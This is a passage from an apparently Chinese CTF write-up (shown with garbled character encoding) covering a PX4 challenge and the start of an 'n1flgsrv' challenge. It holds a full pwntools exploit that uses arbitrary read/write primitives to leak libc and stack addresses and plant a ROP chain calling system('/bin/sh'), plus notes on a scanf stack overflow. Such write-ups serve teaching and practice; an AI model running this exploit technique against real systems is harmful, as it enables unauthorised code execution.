style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">cmd </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">n1_sub_manager publish 0x24</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">list_tasks</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">hpwork</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">tls_addr </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">recvuntil</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\n</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#B07D48"> drop</span><span style="color:#999999">=</span><span style="color:#1E754F">True</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"tls_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">tls_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">leak_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> arbread</span><span style="color:#2993a3">(</span><span style="color:#393A34">tls_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">2f8</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"leak_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">leak_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">libc_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> arbread</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak_addr</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> -</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">93720</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"libc_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">libc_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">000000000002a3e5</span><br><span style="color:#393A34">ret </span><span style="color:#999999">=</span><span style="color:#393A34"> pop_rdi_ret </span><span style="color:#AB5959">+</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">system </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#393A34"> libc</span><span style="color:#999999">.</span><span style="color:#393A34">sym</span><span style="color:#2993a3">[</span><span style="color:#B5695977">'</span><span style="color:#B56959">system</span><span style="color:#B5695977">'</span><span style="color:#2993a3">]</span><br><span style="color:#393A34">binsh </span><span style="color:#999999">=</span><span style="color:#393A34"> libc_addr </span><span style="color:#AB5959">+</span><span style="color:#998418"> next</span><span style="color:#2993a3">(</span><span style="color:#393A34">libc</span><span style="color:#999999">.</span><span style="color:#393A34">search</span><span style="color:#1e754f">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#B56959">/bin/sh</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">leak_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> arbread</span><span style="color:#2993a3">(</span><span style="color:#393A34">tls_addr </span><span style="color:#AB5959">+</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">300</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"leak_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">leak_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">stack_addr </span><span style="color:#999999">=</span><span style="color:#393A34"> arbread</span><span style="color:#2993a3">(</span><span style="color:#393A34">leak_addr</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">log</span><span style="color:#999999">.</span><span style="color:#393A34">info</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"stack_addr => </span><span style="color:#1e754f">{</span><span style="color:#998418">hex</span><span style="color:#a65e2b">(</span><span style="color:#393A34">stack_addr</span><span style="color:#a65e2b">)</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">cmd </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">n1_sub_manager publish 0x23</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">choose</span><span style="color:#2993a3">(</span><span style="color:#393A34">cmd</span><span style="color:#999999">.</span><span style="color:#393A34">encode</span><span style="color:#1e754f">(</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#AB5959">b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">pause</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">arbwrite</span><span style="color:#2993a3">(</span><span style="color:#393A34">stack_addr </span><span style="color:#AB5959">-</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">28</span><span style="color:#999999">,</span><span style="color:#393A34"> flat</span><span style="color:#1e754f">(</span><span style="color:#a65e2b">[</span><span style="color:#393A34">pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh</span><span style="color:#999999">,</span><span style="color:#393A34"> ret</span><span style="color:#999999">,</span><span style="color:#393A34"> system</span><span style="color:#a65e2b">]</span><span style="color:#1e754f">)</span><span style="color:#999999">.</span><span style="color:#393A34">ljust</span><span style="color:#1e754f">(</span><span style="color:#AB5959">0x</span><span style="color:#2F798A">100</span><span style="color:#999999">,</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#A65E2B">\x00</span><span style="color:#B5695977">"</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pwn </span><span style="color:#4D9375">import</span><span style="color:#CB7676"> *</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> sys </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> argv</span><br><br><span style="color:#DBD7CAEE">proc </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">./run/bin/px4</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">log_level </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">info</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">context</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">binary </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> proc</span><br><span style="color:#DBD7CAEE">elf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#666666">,</span><span style="color:#BD976A"> checksec</span><span style="color:#666666">=</span><span style="color:#4D9375">False</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">127.0.0.1</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8080</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#DBD7CAEE"> argv</span><span style="color:#5eaab5">[</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">]</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> '</span><span style="color:#C98A7D">r</span><span style="color:#C98A7D77">'</span><span style="color:#4D9375"> else</span><span style="color:#DBD7CAEE"> process</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">proc</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">libc </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> ELF</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">./libc.so.6</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendlineafter</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">pxh></span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> cmd</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> arbread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    cmd </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"n1_sub_manager write 0x24 </span><span style="color:#5eaab5">{</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">listener debug_key_value</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">timestamp: </span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    return</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D"> (</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#CB7676">def</span><span style="color:#80A665"> arbwrite</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> content</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    cmd </span><span style="color:#666666">=</span><span style="color:#CB7676"> f</span><span style="color:#C98A7D">"n1_sub_manager write 0x23 </span><span style="color:#5eaab5">{</span><span style="color:#B8A965">hex</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">}</span><span style="color:#C98A7D">"</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    cmd </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">n1_sub_manager publish 0x23</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">    choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">content</span><span style="color:#5eaab5">)</span><br><br><br><span style="color:#DBD7CAEE">cmd </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">n1_sub_manager publish 0x24</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">a</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">list_tasks</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">hpwork</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">tls_addr </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\n</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#BD976A"> drop</span><span style="color:#666666">=</span><span style="color:#4D9375">True</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"tls_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">tls_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">leak_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> arbread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tls_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">2f8</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"leak_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">leak_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">libc_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> arbread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak_addr</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> -</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">93720</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"libc_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">libc_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">pop_rdi_ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">000000000002a3e5</span><br><span style="color:#DBD7CAEE">ret </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> pop_rdi_ret </span><span style="color:#CB7676">+</span><span style="color:#4C9A91"> 1</span><br><span style="color:#DBD7CAEE">system </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE"> libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sym</span><span style="color:#5eaab5">[</span><span style="color:#C98A7D77">'</span><span style="color:#C98A7D">system</span><span style="color:#C98A7D77">'</span><span style="color:#5eaab5">]</span><br><span style="color:#DBD7CAEE">binsh </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> libc_addr </span><span style="color:#CB7676">+</span><span style="color:#B8A965"> next</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">libc</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">search</span><span style="color:#4d9375">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">/bin/sh</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">leak_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> arbread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">tls_addr </span><span style="color:#CB7676">+</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">300</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"leak_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">leak_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> arbread</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">leak_addr</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">log</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">info</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"stack_addr => </span><span style="color:#4d9375">{</span><span style="color:#B8A965">hex</span><span style="color:#d4976c">(</span><span style="color:#DBD7CAEE">stack_addr</span><span style="color:#d4976c">)</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">cmd </span><span style="color:#666666">=</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">n1_sub_manager publish 0x23</span><span style="color:#C98A7D77">"</span><br><span style="color:#DBD7CAEE">choose</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">cmd</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#CB7676"> *</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">40</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">arbwrite</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">stack_addr </span><span style="color:#CB7676">-</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">28</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> flat</span><span style="color:#4d9375">(</span><span style="color:#d4976c">[</span><span style="color:#DBD7CAEE">pop_rdi_ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> binsh</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> ret</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> system</span><span style="color:#d4976c">]</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">ljust</span><span style="color:#4d9375">(</span><span style="color:#CB7676">0x</span><span style="color:#4C9A91">100</span><span style="color:#666666">,</span><span style="color:#CB7676"> b</span><span style="color:#C98A7D77">"</span><span style="color:#C99076">\x00</span><span style="color:#C98A7D77">"</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>åƒè¿™ç§é™„ä»¶è¿è¡Œåœ¨ docker é‡Œï¼Œé€šè¿‡ <code class="inline-code">socat</code> è½¬å‘ stdin/stdout åˆ°ç«¯å£çš„é¢˜ç›®ï¼Œä¸€èˆ¬è°ƒè¯•éƒ½æ˜¯ç”¨ <code class="inline-code">socat TCP-LISTEN:8083,fork EXEC:&quot;gdbserver \:9999 ./bin/px4&quot;</code> è°ƒè¯•çš„ï¼Œä½†æ˜¯è¿™é“é¢˜ç›®å¯åŠ¨è„šæœ¬é‡Œæœ‰ <code class="inline-code">echo</code> å‘½ä»¤ï¼Œç”±äº stdin/stdout è¢«è½¬å‘äº†ï¼Œæ‰€ä»¥ä¼šæŠ¥é”™ã€‚</p>
<p>æœ‰ä¸€ä¸ªæ›´ç®€å•çš„åŠæ³•æ˜¯ï¼Œç”±äº docker æ˜¯é€šè¿‡ namespace å®ç°çš„ï¼Œæœ¬æœºä¸Šæ˜¯å¯ä»¥ç›´æ¥æ‰¾åˆ°è¿›ç¨‹çš„ï¼Œæ‰€ä»¥å®Œå…¨å¯ä»¥ä¸ç”¨ gdbserverï¼Œç›´æ¥å…ˆ <code class="inline-code">nc</code> ä¸Šå»ï¼Œç„¶å <code class="inline-code">gdb -pid &lt;pid></code> è°ƒè¯•ï¼Œè¿™æ ·å°±èƒ½å‘ç°ä»»æ„åœ°å€å†™çš„æ—¶å€™çš„ä¸€äº›å‘2333ã€‚</p>
<p>å¾ˆæœ‰æ„æ€çš„é¢˜ï¼Œç»™ä¸œé£å¸ˆå‚…ç‚¹èµã€‚</p>
<h2 id="n1flgsrv" class="scroll-target"><a href="#n1flgsrv"><code class="hash inline-code">#</code>n1flgsrv</a></h2>
<p>è¿™ä¸ªé¢˜å¾ˆå¥½ç©ï¼Œç»™äº†ä¸€ä¸ª <code class="inline-code">srv</code> ç¨‹åºå’Œ <code class="inline-code">cli</code> ç¨‹åºã€‚</p>
<p>ä¸»è¦å…³æ³¨ init æ–‡ä»¶çš„è¿™ä¸¤è¡Œï¼š</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-bash language-bash"><span style="color:#59873A">chroot</span><span style="color:#B56959"> /srv</span><span style="color:#B56959"> /srv</span><span style="color:#999999"> &#x26;</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#59873A">/dev/null</span><span style="color:#AB5959"> 2</span><span style="color:#AB5959">></span><span style="color:#B56959">/dev/null</span><br><span style="color:#59873A">chrooot</span><span style="color:#2F798A"> 1337</span><span style="color:#2F798A"> 1337</span><span style="color:#B56959"> /cli</span><span style="color:#B56959"> /cli</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-bash language-bash"><span style="color:#80A665">chroot</span><span style="color:#C98A7D"> /srv</span><span style="color:#C98A7D"> /srv</span><span style="color:#666666"> &#x26;</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#80A665">/dev/null</span><span style="color:#CB7676"> 2</span><span style="color:#CB7676">></span><span style="color:#C98A7D">/dev/null</span><br><span style="color:#80A665">chrooot</span><span style="color:#4C9A91"> 1337</span><span style="color:#4C9A91"> 1337</span><span style="color:#C98A7D"> /cli</span><span style="color:#C98A7D"> /cli</span><br></code></pre></div>
<p>ç®€å•è§£é‡Šä¸€ä¸‹ï¼Œ<code class="inline-code">srv</code> è¿›ç¨‹ä»¥ root (uid 0) èº«ä»½è¿è¡Œï¼Œå…¶ chroot æ ¹ç›®å½•æ˜¯ <code class="inline-code">/srv</code>ã€‚<code class="inline-code">cli</code> è¿›ç¨‹ä»¥ uid 1337 èº«ä»½è¿è¡Œï¼Œå…¶ chroot æ ¹ç›®å½•æ˜¯ <code class="inline-code">/cli</code>ã€‚</p>
<p>å½“æˆ‘ä»¬è¿æ¥åˆ° <code class="inline-code">n1ctf.2025.remote:13227</code> æ—¶ï¼Œæˆ‘ä»¬é¦–å…ˆäº¤äº’çš„æ˜¯ <code class="inline-code">cli</code> è¿›ç¨‹ã€‚</p>
<p>é¦–å…ˆåˆ†æ cliï¼Œç¨‹åºæ‰£äº†ç¬¦å·è¡¨ï¼Œå¯ä»¥ç”¨ sig æ–‡ä»¶ç®€å•æ¢å¤ä¸€ä¸‹ï¼Œç„¶åæ‹–ç»™ ai åˆ†æï¼ˆæˆ‘æŠŠç”¨åˆ°çš„ sig æ–‡ä»¶æ”¾åœ¨ç›®å½•ä¸‹äº†ï¼‰ã€‚</p>
<p>é€†å‘ä¸€ä¸‹é€»è¾‘ï¼Œå‘ç° <code class="inline-code">sub_4EC110((unsigned int)&quot;%[^\n]%1[\n]&quot;, (unsigned int)v62, ...)</code> è¿™ä¸€è¡Œæ˜¯ <code class="inline-code">scanf(&quot;%[^\n]&quot;, v62)</code>ã€‚<code class="inline-code">scanf</code> æ²¡æœ‰æ£€æŸ¥è¾“å…¥çš„é•¿åº¦ï¼Œå®ƒä¼šæ— é™åœ°å†™å…¥ <code class="inline-code">v62</code>ï¼Œå¯¼è‡´ç»å…¸çš„æ ˆæº¢å‡ºã€‚</p>
